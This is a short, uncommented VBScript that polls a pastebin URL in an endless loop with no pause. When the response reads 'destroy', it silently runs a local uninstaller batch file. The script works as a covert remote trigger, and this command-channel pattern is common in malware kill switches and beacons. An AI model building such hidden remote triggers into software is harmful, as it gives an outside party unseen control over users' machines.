Set wshell = WScript.CreateObject("WScript.Shell")

do

url = "http://pastebin.com/raw/RPW1kzaQ"
set xml = createobject("msxml2.serverxmlhttp.6.0")
with xml
 .open "get", url, false
 .send
If .responsetext = "destroy" Then
wshell.run "uninstaller.bat", 0, false
exit do
End If

end with

loop